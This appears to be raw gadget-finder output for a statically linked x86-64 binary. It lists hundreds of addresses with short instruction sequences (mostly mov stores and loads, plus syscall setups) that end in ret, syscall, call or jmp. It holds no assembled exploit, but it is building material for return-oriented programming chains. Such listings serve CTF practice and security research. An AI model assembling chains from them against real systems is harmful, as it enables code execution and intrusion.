0x00000000004625dd : mov ds, word ptr [rax + rax + 0x63490000] ; ret 0x8944
0x00000000004a93fe : mov ds, word ptr [rdx + rdx - 0x71] ; retf
0x0000000000438e76 : mov dword ptr [r9 - 2], ecx ; ret
0x0000000000438e61 : mov dword ptr [r9 - 4], ecx ; ret
0x000000000044c8c1 : mov dword ptr [rax + 0x10], ecx ; mov qword ptr [rax + 8], rdx ; ret
0x0000000000470b29 : mov dword ptr [rax + 0x10], edx ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000470b69 : mov dword ptr [rax + 0x10], esi ; mov qword ptr [rax + 0x40], rcx ; ret
0x0000000000471b68 : mov dword ptr [rax + 0x18], edx ; mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x000000000044c927 : mov dword ptr [rax + 0x20], ecx ; mov byte ptr [rax + 0x28], 1 ; ret
0x000000000044c941 : mov dword ptr [rax + 0x20], esi ; ret
0x0000000000470b2d : mov dword ptr [rax + 0x40], ecx ; ret
0x0000000000471bea : mov dword ptr [rax + 0x48], 0 ; pop rbx ; ret
0x000000000045137f : mov dword ptr [rax + 0x50], ecx ; mov dword ptr [rax + 0x54], edx ; ret
0x0000000000451382 : mov dword ptr [rax + 0x54], edx ; ret
0x0000000000417d45 : mov dword ptr [rax + 8], 0 ; ret
0x000000000044c8c5 : mov dword ptr [rax + 8], edx ; ret
0x000000000046608d : mov dword ptr [rax], 0x16 ; mov eax, edx ; ret
0x000000000040f402 : mov dword ptr [rax], 0x16 ; xor eax, eax ; ret
0x000000000041e56a : mov dword ptr [rax], 0xc ; mov rax, rsi ; ret
0x00000000004b42dd : mov dword ptr [rax], eax ; add byte ptr [rax - 0x34], dh ; cld ; jmp qword ptr [rsi]
0x0000000000484f7d : mov dword ptr [rax], edi ; pop rbx ; ret
0x0000000000484ecd : mov dword ptr [rax], edx ; add rsp, 8 ; ret
0x000000000041b072 : mov dword ptr [rax], edx ; mov rax, rdx ; add rsp, 8 ; ret
0x0000000000484f71 : mov dword ptr [rax], edx ; pop rbx ; ret
0x000000000048d302 : mov dword ptr [rax], edx ; ret
0x0000000000471edb : mov dword ptr [rax], edx ; xor eax, eax ; ret
0x000000000047c7f1 : mov dword ptr [rbp - 0x100], ebx ; call r10
0x000000000048113f : mov dword ptr [rbp - 0x78], eax ; mov eax, 0x15 ; syscall
0x00000000004697ff : mov dword ptr [rbp - 0x910], esi ; jmp qword ptr [rdx + rax*8]
0x000000000047d191 : mov dword ptr [rbp - 0xe0], ebx ; call r10
0x0000000000459052 : mov dword ptr [rbx + 0x10], 0 ; pop rbx ; ret
0x0000000000413337 : mov dword ptr [rbx + 0x10], eax ; mov rax, rbx ; pop rbx ; ret
0x0000000000481dee : mov dword ptr [rbx + 0x10], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000041371f : mov dword ptr [rbx + 0x10], eax ; xor eax, eax ; pop rbx ; ret
0x000000000047fade : mov dword ptr [rbx + 0x10], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000485c83 : mov dword ptr [rbx + 0x18], 0 ; jmp 0x485c57
0x0000000000481d23 : mov dword ptr [rbx + 0x18], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000488515 : mov dword ptr [rbx + 0x18], eax ; pop rbx ; ret
0x00000000004885e9 : mov dword ptr [rbx + 0x20], eax ; pop rbx ; ret
0x000000000045b5fd : mov dword ptr [rbx + 0x40], esi ; xor eax, eax ; pop rbx ; ret
0x00000000004173dd : mov dword ptr [rbx + 0x40], esp ; mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000416ec1 : mov dword ptr [rbx + 0x50], 0 ; pop rbx ; ret
0x0000000000471d9a : mov dword ptr [rbx + 0x60], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000418b5d : mov dword ptr [rbx + 0x60], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000414ef2 : mov dword ptr [rbx + 0x70], ebp ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000470bb4 : mov dword ptr [rbx + 0x74], eax ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000471a61 : mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000459067 : mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x0000000000485743 : mov dword ptr [rbx], eax ; add rsp, 0x10 ; pop rbx ; ret
0x000000000041736c : mov dword ptr [rbx], eax ; add rsp, 0x20 ; pop rbx ; ret
0x000000000048a549 : mov dword ptr [rbx], eax ; pop rax ; pop rdx ; pop rbx ; ret
0x00000000004173e0 : mov dword ptr [rbx], eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000413235 : mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000471b6b : mov dword ptr [rbx], ecx ; xor eax, eax ; pop rbx ; ret
0x00000000004109e1 : mov dword ptr [rcx + 0x130], edx ; ret
0x0000000000400e3e : mov dword ptr [rcx + rax*2], 0x72f2a30f ; ret 0xfe83
0x00000000004516d5 : mov dword ptr [rcx - 0x7d], 0x940f07fc ; ret 0x1f0f
0x0000000000438e77 : mov dword ptr [rcx - 2], ecx ; ret
0x0000000000438e62 : mov dword ptr [rcx - 4], ecx ; ret
0x0000000000438e51 : mov dword ptr [rcx - 8], ecx ; ret
0x000000000044a554 : mov dword ptr [rcx], eax ; mov eax, 0xffffffff ; jmp 0x44a527
0x00000000004498fa : mov dword ptr [rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x0000000000419aa4 : mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x000000000044520d : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x11] ; ret
0x000000000044524b : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x13] ; ret
0x00000000004452cd : mov dword ptr [rdi + 0x10], ecx ; lea rax, [rdi + 0x17] ; ret
0x0000000000444bbb : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x0000000000444c3d : mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x18], dh ; ret
0x0000000000444b7d : mov dword ptr [rdi + 0x10], ecx ; ret
0x0000000000444c80 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x0000000000444ca0 : mov dword ptr [rdi + 0x10], edx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x0000000000444c61 : mov dword ptr [rdi + 0x10], edx ; mov word ptr [rdi + 0x18], cx ; ret
0x0000000000445333 : mov dword ptr [rdi + 0x17], ecx ; lea rax, [rdi + 0x1a] ; ret
0x0000000000444c83 : mov dword ptr [rdi + 0x17], ecx ; ret
0x0000000000416da3 : mov dword ptr [rdi + 0x18], eax ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000445315 : mov dword ptr [rdi + 0x18], ecx ; lea rax, [rdi + 0x19] ; ret
0x0000000000445353 : mov dword ptr [rdi + 0x18], ecx ; lea rax, [rdi + 0x1b] ; ret
0x0000000000444c65 : mov dword ptr [rdi + 0x18], ecx ; ret
0x0000000000419aa1 : mov dword ptr [rdi + 0x24], ebp ; mov dword ptr [rdi + 0x10], eax ; pop rbx ; pop rbp ; ret
0x000000000047b795 : mov dword ptr [rdi + 0x300], eax ; ret
0x000000000047b767 : mov dword ptr [rdi + 0x308], eax ; ret
0x0000000000416dd3 : mov dword ptr [rdi + 0x48], edx ; mov qword ptr [rdi + 8], rax ; ret
0x000000000048d341 : mov dword ptr [rdi + 0x98], esi ; ret
0x000000000044528d : mov dword ptr [rdi + 0xe], ecx ; lea rax, [rdi + 0x15] ; ret
0x0000000000444bdd : mov dword ptr [rdi + 0xe], ecx ; ret
0x000000000044522b : mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x12] ; ret
0x00000000004452ad : mov dword ptr [rdi + 0xf], ecx ; lea rax, [rdi + 0x16] ; ret
0x0000000000444b9b : mov dword ptr [rdi + 0xf], ecx ; ret
0x0000000000435ff5 : mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435e38 : mov dword ptr [rdi + 1], edx ; mov qword ptr [rdi], rcx ; ret
0x00000000004360d8 : mov dword ptr [rdi + 1], edx ; mov word ptr [rdi], cx ; ret
0x0000000000435f85 : mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435dc8 : mov dword ptr [rdi + 2], edx ; mov qword ptr [rdi], rcx ; ret
0x00000000004450f7 : mov dword ptr [rdi + 3], edx ; lea rax, [rdi + 6] ; ret
0x0000000000435f15 : mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000435d58 : mov dword ptr [rdi + 3], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444ac7 : mov dword ptr [rdi + 3], edx ; ret
0x00000000004450d9 : mov dword ptr [rdi + 4], edx ; lea rax, [rdi + 5] ; ret
0x0000000000435ce8 : mov dword ptr [rdi + 4], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444ab9 : mov dword ptr [rdi + 4], edx ; ret
0x000000000044518b : mov dword ptr [rdi + 5], edx ; lea rax, [rdi + 0xc] ; ret
0x0000000000435c78 : mov dword ptr [rdi + 5], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b2b : mov dword ptr [rdi + 5], edx ; ret
0x00000000004451ab : mov dword ptr [rdi + 6], edx ; lea rax, [rdi + 0xd] ; ret
0x0000000000435c08 : mov dword ptr [rdi + 6], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b3b : mov dword ptr [rdi + 6], edx ; ret
0x0000000000445149 : mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xa] ; ret
0x00000000004451cb : mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xe] ; ret
0x0000000000435b98 : mov dword ptr [rdi + 7], edx ; mov qword ptr [rdi], rcx ; ret
0x0000000000444b09 : mov dword ptr [rdi + 7], edx ; ret
0x00000000004847be : mov dword ptr [rdi + 8], eax ; mov eax, 2 ; ret
0x0000000000416da7 : mov dword ptr [rdi + 8], eax ; ret
0x0000000000482fd4 : mov dword ptr [rdi + 8], ecx ; ret
0x0000000000445169 : mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 0xb] ; ret
0x000000000044512b : mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 9] ; ret
0x0000000000484474 : mov dword ptr [rdi + 8], edx ; mov eax, ecx ; adc eax, eax ; ret
0x0000000000444afb : mov dword ptr [rdi + 8], edx ; ret
0x000000000044860b : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], cx ; ret
0x00000000004478a5 : mov dword ptr [rdi + rdx - 2], ecx ; mov word ptr [rdi], si ; ret
0x0000000000448603 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; ret
0x0000000000448785 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x0000000000447895 : mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x00000000004485fb : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rcx ; ret
0x0000000000447887 : mov dword ptr [rdi + rdx - 8], ecx ; mov qword ptr [rdi], rsi ; ret
0x000000000048d2ec : mov dword ptr [rdi + rsi*8], edx ; ret
0x000000000042faa5 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rcx ; ret
0x000000000042fae3 : mov dword ptr [rdi - 0x10], ebx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000482f3f : mov dword ptr [rdi - 0x10], ecx ; ret
0x000000000042fe2c : mov dword ptr [rdi - 0xa], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435648 : mov dword ptr [rdi - 0xa], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000043000c : mov dword ptr [rdi - 0xb], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004355c8 : mov dword ptr [rdi - 0xb], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004301fc : mov dword ptr [rdi - 0xc], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000435548 : mov dword ptr [rdi - 0xc], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004303cd : mov dword ptr [rdi - 0xd], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x00000000004354b9 : mov dword ptr [rdi - 0xd], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004305cd : mov dword ptr [rdi - 0xe], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435429 : mov dword ptr [rdi - 0xe], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004307cd : mov dword ptr [rdi - 0xf], ecx ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000435399 : mov dword ptr [rdi - 0xf], edx ; mov qword ptr [rdi - 8], rcx ; ret
0x00000000004301ad : mov dword ptr [rdi - 2], ecx ; ret
0x000000000042ffc5 : mov dword ptr [rdi - 2], edx ; ret
0x00000000004301a9 : mov dword ptr [rdi - 3], edx ; mov word ptr [rdi - 2], cx ; ret
0x0000000000430589 : mov dword ptr [rdi - 4], ecx ; ret
0x000000000042fc5f : mov dword ptr [rdi - 4], edx ; ret
0x0000000000430586 : mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430786 : mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000430986 : mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000042faa9 : mov dword ptr [rdi - 8], ecx ; ret
0x000000000042fae7 : mov dword ptr [rdi - 8], edx ; ret
0x000000000042fc5c : mov dword ptr [rdi - 9], eax ; mov dword ptr [rdi - 4], edx ; ret
0x000000000042fd58 : mov dword ptr [rdi - 9], ecx ; mov byte ptr [rdi - 1], dl ; ret
0x000000000042fca4 : mov dword ptr [rdi - 9], ecx ; mov dword ptr [rdi - 4], edx ; ret
0x00000000004356c8 : mov dword ptr [rdi - 9], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000482ec4 : mov dword ptr [rdi], eax ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x0000000000482fce : mov dword ptr [rdi], eax ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x000000000046880a : mov dword ptr [rdi], ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004450c5 : mov dword ptr [rdi], ecx ; lea rax, [rdi + 4] ; ret
0x0000000000445117 : mov dword ptr [rdi], ecx ; lea rax, [rdi + 8] ; ret
0x00000000004450a4 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; lea rax, [rdi + 2] ; ret
0x0000000000444a84 : mov dword ptr [rdi], ecx ; mov byte ptr [rdi + 2], dh ; ret
0x00000000004450f5 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; lea rax, [rdi + 6] ; ret
0x0000000000444ac5 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x0000000000445147 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; lea rax, [rdi + 0xa] ; ret
0x0000000000444b07 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000445167 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; lea rax, [rdi + 0xb] ; ret
0x0000000000444b17 : mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 8], edx ; ret
0x00000000004475d7 : mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x0000000000444b28 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 5], rdx ; ret
0x0000000000444b38 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 6], rdx ; ret
0x0000000000444b48 : mov dword ptr [rdi], ecx ; mov qword ptr [rdi + 7], rdx ; ret
0x0000000000444ab6 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x0000000000444af8 : mov dword ptr [rdi], ecx ; mov word ptr [rdi + 8], dx ; ret
0x00000000004475e3 : mov dword ptr [rdi], ecx ; mov word ptr [rsi - 2], cx ; ret
0x0000000000435b9c : mov dword ptr [rdi], ecx ; ret
0x000000000044877f : mov dword ptr [rdi], ecx ; vzeroupper ; ret
0x0000000000445094 : mov dword ptr [rdi], edx ; lea rax, [rdi + 1] ; ret
0x00000000004450b2 : mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x0000000000445104 : mov dword ptr [rdi], edx ; lea rax, [rdi + 7] ; ret
0x0000000000435ea4 : mov dword ptr [rdi], edx ; ret
0x000000000045cd33 : mov dword ptr [rdi], esi ; cli ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x0000000000438e5f : mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x0000000000484646 : mov dword ptr [rdi], esi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x0000000000438e4e : mov dword ptr [rdi], esi ; mov qword ptr [r9 - 8], rcx ; ret
0x0000000000438e73 : mov dword ptr [rdi], esi ; mov word ptr [r9 - 2], cx ; ret
0x000000000044788c : mov dword ptr [rdi], esi ; ret
0x000000000042e6c2 : mov dword ptr [rdi], esp ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; retf 0x280f
0x00000000004133b5 : mov dword ptr [rdx + 0x130], edi ; pop rbx ; ret
0x0000000000444617 : mov dword ptr [rdx + 3], eax ; lea rax, [rdx + 6] ; ret
0x0000000000442e47 : mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x00000000004445f9 : mov dword ptr [rdx + 4], eax ; lea rax, [rdx + 5] ; ret
0x0000000000442e39 : mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x00000000004446ab : mov dword ptr [rdx + 5], eax ; lea rax, [rdx + 0xc] ; ret
0x0000000000444629 : mov dword ptr [rdx + 5], eax ; lea rax, [rdx + 8] ; ret
0x0000000000442e59 : mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x00000000004446cb : mov dword ptr [rdx + 6], eax ; lea rax, [rdx + 0xd] ; ret
0x0000000000444649 : mov dword ptr [rdx + 6], eax ; lea rax, [rdx + 9] ; ret
0x0000000000442e69 : mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x0000000000444669 : mov dword ptr [rdx + 7], eax ; lea rax, [rdx + 0xa] ; ret
0x00000000004446eb : mov dword ptr [rdx + 7], eax ; lea rax, [rdx + 0xe] ; ret
0x0000000000442e79 : mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x000000000046b460 : mov dword ptr [rdx + 8], eax ; jmp 0x46b434
0x0000000000444689 : mov dword ptr [rdx + 8], eax ; lea rax, [rdx + 0xb] ; ret
0x000000000044457b : mov dword ptr [rdx + 8], eax ; lea rax, [rdx + 0xf] ; ret
0x0000000000442dcb : mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x0000000000418cd0 : mov dword ptr [rdx + 8], eax ; xor eax, eax ; ret
0x00000000004445a4 : mov dword ptr [rdx], eax ; lea rax, [rdx + 1] ; ret
0x00000000004445d2 : mov dword ptr [rdx], eax ; lea rax, [rdx + 3] ; ret
0x0000000000444524 : mov dword ptr [rdx], eax ; lea rax, [rdx + 7] ; ret
0x0000000000449f0a : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; ret
0x0000000000484648 : mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00000000004847a5 : mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x000000000044a1ba : mov dword ptr [rdx], eax ; mov rax, -1 ; ret
0x0000000000442d74 : mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x0000000000484f5d : mov dword ptr [rdx], eax ; pop rbx ; ret
0x0000000000418c38 : mov dword ptr [rdx], eax ; ret
0x000000000049023f : mov dword ptr [rip + 0x22baab], ebx ; jne 0x490231 ; pop rbx ; ret
0x0000000000484aa8 : mov dword ptr [rip + 0x2375ba], eax ; ret
0x000000000047f3b5 : mov dword ptr [rip + 0x23cff5], eax ; ret
0x000000000045b428 : mov dword ptr [rip + 0x25f68a], edx ; je 0x45b441 ; ret
0x000000000044dd06 : mov dword ptr [rip + 0x26adac], edx ; pop rbx ; ret
0x00000000004200e6 : mov dword ptr [rip + 0x299774], eax ; ret
0x000000000041a00c : mov dword ptr [rip + 0x29f84e], eax ; ret
0x0000000000419b07 : mov dword ptr [rip + 0x29fce3], eax ; ret
0x0000000000419b1e : mov dword ptr [rip + 0x29fce8], eax ; ret
0x0000000000419adf : mov dword ptr [rip + 0x29fd03], eax ; ret
0x0000000000419abf : mov dword ptr [rip + 0x29fd1b], eax ; ret
0x00000000004199b5 : mov dword ptr [rip + 0x29fe8d], eax ; ret
0x00000000004199a5 : mov dword ptr [rip + 0x29fe95], eax ; ret
0x0000000000419993 : mov dword ptr [rip + 0x29fe97], edx ; ret
0x0000000000419955 : mov dword ptr [rip + 0x29fe9d], eax ; ret
0x0000000000419945 : mov dword ptr [rip + 0x29feb5], eax ; ret
0x0000000000419b34 : mov dword ptr [rip + 0x2a225a], eax ; ret
0x00000000004018b3 : mov dword ptr [rsi + 0x10], esi ; syscall
0x00000000004475e6 : mov dword ptr [rsi - 2], ecx ; ret
0x00000000004475d9 : mov dword ptr [rsi - 4], ecx ; ret
0x0000000000478981 : mov dword ptr [rsi], 0xffffffff ; xor eax, eax ; ret
0x000000000048d32e : mov dword ptr [rsi], eax ; mov rax, qword ptr [rdi + 0x98] ; ret
0x000000000047f522 : mov dword ptr [rsi], eax ; ret
0x000000000047e869 : mov dword ptr [rsi], edi ; mov rax, rcx ; ret
0x000000000040f5aa : mov dword ptr [rsi], edi ; xor eax, eax ; jmp 0x40f576
0x000000000041d2aa : mov dword ptr [rsp + 0x10], ebx ; mov qword ptr [rsp + 8], rax ; call rcx
0x000000000041d367 : mov dword ptr [rsp + 0x10], edx ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000451a6c : mov dword ptr [rsp + 0x50], eax ; call 0x44dd46
0x000000000041d2af : mov dword ptr [rsp + 8], eax ; call rcx
0x000000000040962b : mov dword ptr [rsp + 8], ecx ; call 0x406136
0x0000000000411b3e : mov dword ptr [rsp + 8], ecx ; mov rdi, r15 ; call rax
0x000000000041d8c4 : mov dword ptr [rsp + 8], edx ; call 0x419b66
0x0000000000403e12 : mov dword ptr [rsp + 8], edx ; call 0x420106
0x000000000041d8c3 : mov dword ptr [rsp + 8], r10d ; call 0x419b67
0x0000000000403e11 : mov dword ptr [rsp + 8], r10d ; call 0x420107
0x0000000000489cf3 : mov dword ptr [rsp], eax ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000413c12 : mov dword ptr [rsp], ecx ; mov rdi, rbx ; call rax
0x0000000000416f25 : mov dword ptr [rsp], edi ; call 0x4131b5
0x000000000046608c : mov dword ptr fs:[rax], 0x16 ; mov eax, edx ; ret
0x000000000040f401 : mov dword ptr fs:[rax], 0x16 ; xor eax, eax ; ret
0x0000000000475a5c : mov dword ptr fs:[rax], edx ; xor eax, eax ; ret
0x000000000044a553 : mov dword ptr fs:[rcx], eax ; mov eax, 0xffffffff ; jmp 0x44a528
0x00000000004498f9 : mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x0000000000449f09 : mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x0000000000447894 : mov dword ptr ss:[rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000042ffc0 : mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000444a70 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000400cac : mov eax, 0 ; leave ; ret
0x0000000000448acb : mov eax, 0x10 ; pop rbx ; ret
0x0000000000475799 : mov eax, 0x101 ; syscall
0x0000000000475712 : mov eax, 0x106 ; syscall
0x000000000044acb7 : mov eax, 0x12e ; xor edi, edi ; syscall
0x000000000047e039 : mov eax, 0x14 ; syscall
0x000000000044c994 : mov eax, 0x15 ; syscall
0x0000000000423dc0 : mov eax, 0x16 ; ret
0x0000000000449e60 : mov eax, 0x18 ; syscall
0x000000000044c5f3 : mov eax, 0x19 ; syscall
0x000000000044af50 : mov eax, 0x1c ; syscall
0x0000000000448ad9 : mov eax, 0x20 ; pop rbx ; ret
0x00000000004498e0 : mov eax, 0x25 ; syscall
0x00000000004886b0 : mov eax, 0x26 ; syscall
0x0000000000485420 : mov eax, 0x27 ; syscall
0x0000000000448ad2 : mov eax, 0x30 ; pop rbx ; ret
0x0000000000475640 : mov eax, 0x3f ; syscall
0x0000000000448ae7 : mov eax, 0x40 ; pop rbx ; ret
0x00000000004a6efb : mov eax, 0x45155e93 ; ret 0x591c
0x000000000044a357 : mov eax, 0x48 ; syscall
0x000000000044a63b : mov eax, 0x4f ; syscall
0x0000000000458428 : mov eax, 0x5b000000 ; pop r12 ; ret
0x0000000000448ae0 : mov eax, 0x60 ; pop rbx ; ret
0x000000000044c620 : mov eax, 0x63 ; syscall
0x0000000000475670 : mov eax, 0x66 ; syscall
0x0000000000475690 : mov eax, 0x68 ; syscall
0x0000000000475680 : mov eax, 0x6b ; syscall
0x00000000004756a0 : mov eax, 0x6c ; syscall
0x0000000000448abd : mov eax, 0x80 ; pop rbx ; ret
0x0000000000489aff : mov eax, 0x89000003 ; fmul dword ptr [rbx + rcx*4 + 0x34] ; ret 0xf41
0x0000000000486d14 : mov eax, 0x89fd8945 ; ret 0xe283
0x00000000004018ad : mov eax, 0x9e ; mov qword ptr [rsi + 0x10], rsi ; syscall
0x000000000044af20 : mov eax, 0xa ; syscall
0x000000000044aef0 : mov eax, 0xb ; syscall
0x000000000040dc82 : mov eax, 0xba ; syscall
0x00000000004b0914 : mov eax, 0xc800004f ; retf 0xfff9
0x0000000000474f10 : mov eax, 0xc9 ; syscall
0x000000000047b6ba : mov eax, 0xca ; syscall
0x000000000040dcb0 : mov eax, 0xe ; syscall
0x0000000000449bd5 : mov eax, 0xe5 ; syscall
0x000000000040dc8e : mov eax, 0xea ; syscall
0x000000000045b621 : mov eax, 0xf ; syscall
0x00000000004b0c14 : mov eax, 0xf000052 ; stc ; hlt ; jmp qword ptr [rbx]
0x0000000000458bec : mov eax, 0xff514ee8 ; dec dword ptr [rcx + rcx*4 - 9] ; call rbx
0x000000000044a556 : mov eax, 0xffffffff ; jmp 0x44a525
0x0000000000412831 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004125b7 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x0000000000413733 : mov eax, 0xffffffff ; pop rbx ; ret
0x000000000041257b : mov eax, 0xffffffff ; ret
0x0000000000475ed1 : mov eax, 1 ; leave ; ret
0x0000000000484625 : mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x0000000000417aa2 : mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048694d : mov eax, 1 ; pop rbx ; pop rbp ; ret
0x000000000047fe30 : mov eax, 1 ; pop rbx ; ret
0x000000000046876f : mov eax, 1 ; ret
0x000000000044a21a : mov eax, 1 ; syscall
0x0000000000474763 : mov eax, 2 ; ret
0x00000000004749c1 : mov eax, 3 ; ret
0x000000000044a4ea : mov eax, 3 ; syscall
0x000000000048e1af : mov eax, 4 ; jne 0x48e1d8 ; ret
0x00000000004749d1 : mov eax, 4 ; ret
0x0000000000449eee : mov eax, 4 ; syscall
0x00000000004749e1 : mov eax, 5 ; ret
0x0000000000449f3c : mov eax, 5 ; syscall
0x00000000004749f1 : mov eax, 6 ; ret
0x00000000004756be : mov eax, 6 ; syscall
0x0000000000474a01 : mov eax, 7 ; ret
0x0000000000448ac4 : mov eax, 8 ; pop rbx ; ret
0x000000000044f190 : mov eax, 8 ; ret
0x000000000044a2e0 : mov eax, 8 ; syscall
0x000000000044ae4c : mov eax, 9 ; syscall
0x00000000004120d1 : mov eax, dword ptr [rax + 0x20] ; jmp rax
0x0000000000471ff4 : mov eax, dword ptr [rax + 0x4c] ; ret
0x0000000000417c88 : mov eax, dword ptr [rax + 0x68] ; test rax, rax ; jne 0x417c89 ; ret
0x0000000000481be1 : mov eax, dword ptr [rax + 8] ; ret
0x0000000000459a60 : mov eax, dword ptr [rax + rbp*8] ; test rax, rax ; je 0x459a72 ; call rax
0x000000000046be0a : mov eax, dword ptr [rax + rcx*8] ; mov ecx, 1 ; jmp rax
0x000000000045b46f : mov eax, dword ptr [rax + rdi*8 + 0x80] ; ret
0x00000000004609dd : mov eax, dword ptr [rax + rdi*8] ; jmp rax
0x000000000048af69 : mov eax, dword ptr [rax] ; lea rax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x000000000048af51 : mov eax, dword ptr [rax] ; mov qword ptr [r10], r8 ; ret
0x000000000047fe49 : mov eax, dword ptr [rax] ; ret
0x000000000047c730 : mov eax, dword ptr [rbp - 0xb8] ; add rax, r11 ; call rax
0x000000000047c551 : mov eax, dword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000416f0d : mov eax, dword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000484f79 : mov eax, dword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
